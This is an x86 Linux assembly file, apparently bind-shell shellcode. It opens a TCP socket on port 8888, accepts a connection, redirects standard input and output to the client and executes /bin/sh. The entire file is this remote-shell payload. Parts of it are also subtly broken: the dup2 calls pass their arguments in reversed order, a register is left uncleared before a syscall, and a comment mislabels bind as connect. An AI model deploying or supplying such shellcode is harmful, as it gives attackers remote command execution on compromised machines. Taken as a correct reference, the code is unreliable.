global _start

section .text
_start:

;###socket###
;socket(AF_INET , SOCK_STREAM , 0);

xor eax, eax
mov al, 0x66 ;socketcall
xor ebx, ebx

;push the list of arguments onto the stack
push ebx ;PROT
push 0x01 ;SOCK_STREAM
push 0x02 ;AF_INET

mov bl, 0x01 ;socket function

mov ecx, esp ;pass the pointer to the list of arguments to ecx

int 0x80
mov edi, eax ; save socket fd into edi (eax may change!)

;###bind###

;struct sockaddr_in {
;	unsigned short  sin_family;     /*  Internet protocol (AF_INET) */
;	unsigned short  sin_port;       /* Address port (16 bits) */
;	struct in_addr sin_addr;        /*  Internet address (32 bits) */
;	char sin_zero[8];               /* Not used */
;};
;
;struct in_addr {
;	unsigned long s_addr;  // load with inet_aton()
;};
push 0x0101017f 
push word 0xb822 ; sin_port=8888 
push word 0x02

mov esi, esp ;save the pointer to the struct in esi

;bind syscall
;int connect(int socket, struct sockaddr *foreignAddress, unsigned int addressLength)
xor eax, eax
mov al, 0x66 ;socketcall
xor ebx, ebx
mov bl, 0x02 ;bind

push 0x10 ;addressLength=16bytes. short+short+8+long=2+2+8+4=16
push esi ;address of the struct 
push edi ;socket fd

mov ecx, esp ;pass the pointer to the list of arguments to ecx
int 0x80

;###listen###
xor eax, eax
push eax
mov al, 0x66 ;socketcall
xor ebx, ebx
mov bl, 0x04 ;listen function
push edi

mov ecx, esp
int 0x80

;###accept###
xor eax, eax
xor ebx, ebx
xor ecx, ecx
push eax ;NULL
push eax ;NULL
push edi

mov al, 0x66 ;socketcall
mov bl, 0x05 ;accept function

mov ecx, esp
int 0x80

mov esi, eax ;save the client socket fd into esi

;###copy file descriptors###
;dup2(clntSock, 0);
;dup2(clntSock, 1);
;dup2(clntSock, 2);

mov al, 0x3f ;dup2
mov ecx, esi
xor ebx, ebx

int 0x80

mov al, 0x3f ;dup2
mov bl, 0x1
mov ecx, esi

int 0x80

mov al, 0x3f ;dup2
mov bl, 0x2
mov ecx, esi

int 0x80

;###execve###
xor eax, eax
mov al, 0x0b ;sys_execve
xor ebx, ebx 
push ebx ;terminate string with \0
push 0x68732f2f ;String "hs//"
push 0x6e69622f;String "nib/"
mov ebx, esp

xor ecx, ecx
xor edx, edx

int 0x80
